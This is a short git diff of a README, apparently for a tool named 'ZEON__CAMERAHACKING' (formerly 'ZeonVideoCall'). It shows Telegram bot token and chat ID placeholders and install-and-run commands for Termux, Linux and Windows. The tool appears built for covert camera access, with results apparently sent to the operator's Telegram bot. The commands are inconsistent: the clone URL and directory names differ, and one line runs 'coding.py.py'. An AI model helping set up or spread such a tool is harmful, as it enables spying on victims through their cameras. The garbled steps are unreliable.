@@ -70,7 +70,7 @@
 # 6. Search @userinfobot → Get chat ID
 ```
 
-Update app.py:
+Update coding.py:
 
 ```python
 TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
@@ -86,19 +86,19 @@ TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
 ```bash
 pkg update && pkg upgrade -y
 pkg install python -y
-git clone https://github.com/Zeonexploiter/ZeonVideoCall.git
-cd ZeonVideoCall
+git clone https://github.com/Zeonexploiter/ZEON__CAMERAHACKING.git
+cd ZEONCAMERAHACKING
 pip install -r requirements.txt
-python app.py
+python coding.py.py
 ```
 
 💻 Linux / Windows
 
 ```bash
-git clone https://github.com/Zeonexploiter/ZeonVideoCall.git
-cd ZeonVideoCall
+git clone https://github.com/Zeonexploiter/ZEONCAMERAHACKING.git
+cd ZEONCAMERAHACKING
 pip install -r requirements.txt
-python app.py
+python coding.py
 ```
 
 ---
